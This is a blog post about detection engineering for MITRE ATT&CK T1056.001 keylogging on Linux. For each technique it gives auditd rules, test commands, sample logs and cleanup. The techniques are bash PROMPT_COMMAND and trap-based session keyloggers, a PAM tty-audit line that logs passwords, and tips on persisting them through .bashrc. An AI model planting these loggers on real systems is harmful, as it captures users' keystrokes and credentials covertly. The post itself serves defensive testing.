---
layout: post
title: "Input Capture: Keylogging"
strapline: "T1056.001 - MITRE ATT&CK"
date: 2021-10-15 
published: true
permalink: input-capture-keylogging
lastmod: 2021-10-15
changefreq: monthly
priority: 0.5
categories: ATT&CK Atomic auditd
excerpt_separator: <!--excerpt-->
---

### [Description from ATT&CK](https://attack.mitre.org/techniques/T1056/001/)

Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.[1] Some methods include:

- Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.
- Reading raw keystroke data from the hardware buffer.
- Windows Registry modifications.
- Custom drivers.

Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.[2]

<!--excerpt-->

<br>

## Configuration 

To build a set of controls to detect the activities described in MITRE ATT&CK's T1056.001 - Input Capture: Keylogging we will use the Linux Audit daemon auditd to detect and record any configuration changes.

### auditd rules

    auditctl -w /usr/bin/logger -p xa -k CMD_LOGGER
    auditctl -w /usr/bin/tee -p xa -k CMD_TEE

<br>

## Controls and Tests

### 1. Logging bash history to syslog

There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable "if set" will be executed before the PS1 variable and can be configured to write the latest "bash history" entries to the syslog.

To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 

Command:

    PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'

Test:

    date +"%b %d %T"
    echo "Hello World!" 
    if [ "$(grep 'Hello World!' /var/log/syslog)" ]; \
    then echo "FOUND"; \
    else echo NOT FOUND; \
    fi 

Log: syslog

    Jul 10 10:53:41 killingtime ubuntu[2837]  : echo "Hello World!"

Log: ausearch -i --start 10/07/21 10:50:00

    ----
    type=PROCTITLE ... proctitle=tee -a /home/ubuntu/.bash_history 
    type=PATH ... name=/usr/bin/tee ... 
    type=CWD ... cwd=/home/ubuntu 
    type=EXECVE ... a0=tee a1=-a a2=/home/ubuntu/.bash_history 
    type=SYSCALL ... comm=tee exe=/usr/bin/tee ... key=CMD_TEE 
    ----
    type=PROCTITLE ... proctitle=logger -t ubuntu[2837]   
    type=PATH ... name=/usr/bin/logger ...
    type=CWD ... cwd=/home/ubuntu 
    type=EXECVE ... a0=logger a1=-t a2=ubuntu[2837]   
    type=SYSCALL ... comm=logger exe=/usr/bin/logger ... key=CMD_LOGGER 

Cleanup:

    unset PROMPT_COMMAND

<br>

### 2. Bash session based keylogger

When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = "echo $BASH_COMMAND". The trap command is not external, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a 
file, creating a bash session based keylogger. 

To gain persistence the command could be added to the users .bashrc or 
.bash_aliases or the systems default .bashrc in /etc/skel/ 

Command:

    trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> /tmp/.keyboard.log' DEBUG

Test:

    echo "Hello World!"

    if [ "$(grep 'Hello World!' /tmp/.keyboard.log)" ]; \
    then echo "FOUND!"; \
    else echo NOT FOUND!; \
    fi 

Log: tail -f /tmp/.keyboard.log

    10/07/21 11:06:18.1625911578 ubuntu echo "Hello World!"

Cleanup:

    rm /tmp/.keyboard.log

<br>

### 3. SSHD PAM keylogger

Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in an ssh session and place them in the /var/log/audit/audit.log file after the session closes.

Command:

    cp -v /etc/pam.d/sshd /tmp/

    echo "session required pam_tty_audit.so disable=* enable=* open_only log_passwd" >> /etc/pam.d/sshd

    systemctl restart sshd
    systemctl restart auditd

Test:

    ssh ubuntu@localhost 
    echo "ubuntu@localhost"
    sudo su
    echo "root@localhost"
    exit
    exit

Log: aureport --tty

    57. 07/12/21 16:37:52 681 1000 ? 26 sudo "ubuntu"
    58. 07/12/21 16:38:08 691 1000 ? 26 bash "echo \"root@localhost\"",<ret>,"exit",<ret>
    59. 07/12/21 16:38:08 696 1000 ? 26 sudo <nl>
    60. 07/12/21 16:38:09 697 1000 ? 26 bash "echo \"ubuntu@localhost\"",<ret>,"sudo su",<ret>,"exit",<ret>

Log: ausearch -i 

    type=TTY msg=audit(07/12/21 16:37:52.111:681) : tty pid=130120 uid=ubuntu auid=ubuntu ses=26 major=136 minor=0 comm=sudo data="ubuntu"
    type=TTY msg=audit(07/12/21 16:38:08.199:691) : tty pid=130123 uid=root auid=ubuntu ses=26 major=136 minor=0 comm=bash data="echo \"root@localhost\"",<ret>,"exit",<ret>
    type=TTY msg=audit(07/12/21 16:38:08.203:696) : tty pid=130120 uid=root auid=ubuntu ses=26 major=136 minor=0 comm=sudo data=<nl>
    type=TTY msg=audit(07/12/21 16:38:09.487:697) : tty pid=130111 uid=ubuntu auid=ubuntu ses=26 major=136 minor=0 comm=bash data="echo \"ubuntu@localhost\"",<ret>,"sudo su",<ret>,"exit",<ret>

Cleanup:

    cp -fv /tmp/sshd /etc/pam.d/

<br>

### 4. Auditd keylogger

The linux audit tool auditd can be used to capture 32 and 64bit command execution and place the command in the /var/log/audit/audit.log audit log. 

Command:

    auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
    auditctl -a always,exit -F arch=b32 -S execve -k CMDS

We can control these duplicates using HISTCONTROL variable. HISTCONTROL can have the following values:

- ignorespace - lines beginning with a space will not be saved in history.
- ignoredups - lines matching the previous history entry will not be saved. In other words, duplicates are ignored.
- ignoreboth - It is shorthand for "ignorespace" and "ignoredups" values. If you set these two values to HISTCONTROL variable, the lines beginning with a space and the duplicates will not be saved.
- erasedups - eliminate duplicates across the whole history.

    echo $HISTCONTROL -> ignoredups:ignorespace
    OLD_HISTCONTROL=$HISTCONTROL; echo $OLD_HISTCONTROL
    HISTCONTROL=""; echo $HISTCONTROL

Test:

    T=$(date +"%d/%m/%y %H:%M:%S"); whoami
    
Log: ausearch -i --start $T --end $T

    ----
    type=PROCTITLE ... proctitle=date +%d/%m/%y %H:%M:%S 
    type=PATH ... name=/usr/bin/date ... 
    type=CWD ... cwd=/root 
    type=EXECVE ... a0=date a1=+%d/%m/%y %H:%M:%S 
    type=SYSCALL ... comm=date exe=/usr/bin/date ... key=CMDS 
    ----
    type=PROCTITLE ... proctitle=whoami 
    type=PATH ... name=/usr/bin/whoami ... 
    type=CWD ... cwd=/root 
    type=EXECVE ... a0=whoami 
    type=SYSCALL ... comm=whoami exe=/usr/bin/whoami ... key=CMDS 
    ----
    type=PROCTITLE ... proctitle=ausearch -i --start 09/07/21 18:13:19 ...
    type=PATH ... name=/usr/sbin/ausearch ... 
    type=CWD ... cwd=/root 
    type=EXECVE ... a0=ausearch a1=-i a2=--start a3=09/07/21 a4=18:13:19 ...
    type=SYSCALL ... comm=ausearch exe=/usr/sbin/ausearch ... key=CMDS 

<br>

### Conclusion

auditd can detect changes to configuration files and the use of executables, but cannot detect bash session loggers.


<br>

### References:

- [MITRE ATT&CK - Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001/)
- [man auditd](https://manpages.ubuntu.com/manpages/xenial/en/man8/auditd.8.html)

